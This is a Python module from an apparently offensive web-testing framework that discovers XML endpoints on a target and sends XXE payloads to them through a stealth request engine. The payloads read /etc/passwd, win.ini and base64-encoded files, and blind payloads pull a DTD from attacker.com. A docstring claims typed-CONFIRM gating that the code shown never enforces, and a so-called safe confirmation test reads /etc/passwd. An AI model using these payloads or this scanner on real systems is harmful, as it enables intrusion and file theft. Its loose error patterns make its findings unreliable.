"""
modules/validate/xxe.py
───────────────────────
XXE (XML External Entity) validation module.

Detects and validates XXE injection vulnerabilities:
  - XML entity injection detection
  - DOCTYPE declaration injection
  - External DTD loading
  - Local file inclusion via XXE (/etc/passwd)
  - Blind XXE (out-of-band detection)
  - Parameter entity injection
  - SOAP injection via XXE

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class XXEValidator:
    """
    XXE injection detection and validation.
    """

    # XXE payloads
    PAYLOADS = {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd">%remote;]><root/>',
        ],
        "parameter_entity": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd"> %dtd;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd"> %remote;]><root/>',
        ],
        "soap": [
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd"> %dtd;]><xxx/>]]></foo></soap:Body></soap:Envelope>',
        ],
        "out_of_band": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://attacker.com/xxe.dtd">%remote;]><root/>',
        ],
        "xinclude": [
            '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
            '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker.com/xxe.xml" parse="xml"/></root>',
        ],
    }

    # XXE error patterns
    ERROR_PATTERNS = [
        r"XML",
        r"DOCTYPE",
        r"ENTITY",
        r"external entity",
        r"parsing XML",
        r"XML parser",
        r"SAX",
        r"DOM",
        r"Xerces",
        r"LibXML",
        r"Expat",
        r"SimpleXML",
        r"DOMDocument",
        r"XMLReader",
        r"XMLWriter",
    ]

    # File read patterns
    FILE_PATTERNS = {
        "passwd": [r"root:.*:0:0", r"/etc/passwd", r"nobody:x:"],
        "winini": [r"\[extensions\]", r"\[mci extensions\]"],
        "hosts": [r"127.0.0.1", r"localhost"],
        "shadow": [r"root:\$", r"/etc/shadow"],
        "group": [r"root:x:0:", r"/etc/group"],
    }

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.xxe")
        self.out_dir = session.dir("validate") / "xxe"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_xml_endpoints(self, target: str) -> List[str]:
        """
        Detect potential XML endpoints.
        """
        self.logger.info(f"Detecting XML endpoints: {target}")

        endpoints = []

        # Common XML paths
        paths = [
            "/xml",
            "/api/xml",
            "/data/xml",
            "/soap",
            "/soap/",
            "/wsdl",
            "/api/soap",
            "/webservice",
            "/api/webservice",
            "/xmlrpc",
            "/api/xmlrpc",
            "/rpc",
            "/api/rpc",
        ]

        for base_url in [f"https://{target}", f"http://{target}"]:
            for path in paths:
                try:
                    test_url = base_url.rstrip("/") + path
                    status, headers, content = self.stealth.get(test_url, timeout=5)

                    if status in [200, 401, 403]:
                        endpoints.append(test_url)
                        self.logger.debug(f"Found endpoint: {test_url}")

                    self.stealth.sleep(0.3)

                except Exception:
                    pass

        return endpoints

    def test_injection(self, url: str) -> Dict[str, Any]:
        """
        Test for XXE injection.
        """
        self.logger.info(f"Testing XXE injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
            "file_read": None,
        }

        # Test each payload type
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads[:2]:
                try:
                    headers = {"Content-Type": "application/xml"}
                    status, headers, content = self.stealth.post(
                        url,
                        payload.encode(),
                        headers=headers,
                        timeout=10
                    )

                    # Check for file content
                    file_content = self._check_file_content(content)

                    if file_content:
                        result["vulnerable"] = True
                        if payload_type not in result["vuln_types"]:
                            result["vuln_types"].append(payload_type)
                        result["payloads"].append(payload[:50])
                        result["evidence"].append(content[:200])
                        result["file_read"] = file_content
                        self.logger.finding(f"XXE injection detected: {payload_type}", severity="critical", host=url)
                        break

                    # Check for XXE errors
                    if self._check_xxe_errors(content):
                        result["vulnerable"] = True
                        if payload_type not in result["vuln_types"]:
                            result["vuln_types"].append(payload_type)
                        result["payloads"].append(payload[:50])
                        result["evidence"].append(content[:200])
                        self.logger.finding(f"XXE injection detected (error pattern): {payload_type}", severity="critical", host=url)
                        break

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")

        return result

    def _check_file_content(self, content: str) -> Optional[str]:
        """
        Check if content contains file content.
        """
        for file_type, patterns in self.FILE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.I):
                    return f"Found {file_type} content"

        return None

    def _check_xxe_errors(self, content: str) -> bool:
        """
        Check for XXE error patterns.
        """
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, content, re.I):
                return True
        return False

    def confirm_vulnerability(self, url: str) -> bool:
        """
        Confirm XXE with a safe test.
        """
        self.logger.info(f"Confirming XXE on {url}")

        # Use a safe test that returns a unique string
        test_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'

        try:
            headers = {"Content-Type": "application/xml"}
            status, headers, content = self.stealth.post(url, test_payload.encode(), headers=headers, timeout=10)

            if "root:" in content or "nobody" in content:
                self.logger.finding(f"XXE confirmed on {url}", severity="critical", host=url)
                return True

        except Exception as e:
            self.logger.debug(f"Confirmation failed: {e}")

        return False

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full XXE validation workflow.
        """
        self.logger.info(f"XXE validation: {url}")

        results = {
            "url": url,
            "vulnerable": [],
            "confirmed": False,
            "file_read": None,
            "status": "completed"
        }

        # Test injection
        test_result = self.test_injection(url)
        if test_result["vulnerable"]:
            results["vulnerable"].append(test_result)
            results["file_read"] = test_result.get("file_read")

            # Confirm
            if self.confirm_vulnerability(url):
                results["confirmed"] = True

                self.session.add_finding(Finding(
                    source="validate.xxe",
                    title=f"XXE injection confirmed on {url}",
                    severity=SeverityLevel.CRITICAL,
                    host=url,
                    tags=["xxe", "xml", "injection", "validated"],
                    evidence=json.dumps(test_result["evidence"][:3]),
                    remediation="Disable external entity processing. Use safe XML parsers.",
                ))

                if results["file_read"]:
                    self.session.add_finding(Finding(
                        source="validate.xxe",
                        title=f"XXE file read: {results['file_read']}",
                        severity=SeverityLevel.CRITICAL,
                        host=url,
                        tags=["xxe", "file-read", "exfiltration"],
                        evidence=test_result["evidence"][0] if test_result["evidence"] else "",
                        remediation="Disable external entity processing. Use safe XML parsers.",
                    ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run XXE injection validation on target.
        """
        self.logger.banner(f"XXE INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        # Detect XML endpoints
        endpoints = self.detect_xml_endpoints(target)

        if not endpoints:
            endpoints = [f"https://{target}", f"http://{target}"]

        results = {
            "target": target,
            "endpoints_tested": [],
            "vulnerabilities": [],
            "confirmed": [],
            "file_reads": []
        }

        for url in endpoints:
            try:
                result = self.validate(url)
                results["endpoints_tested"].append(url)
                if result["vulnerable"]:
                    results["vulnerabilities"].extend(result["vulnerable"])
                if result["confirmed"]:
                    results["confirmed"].append(url)
                if result["file_read"]:
                    results["file_reads"].append({
                        "url": url,
                        "file": result["file_read"]
                    })
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"xxe_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"XXE validation: {len(results['confirmed'])} confirmed, {len(results['file_reads'])} file reads")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]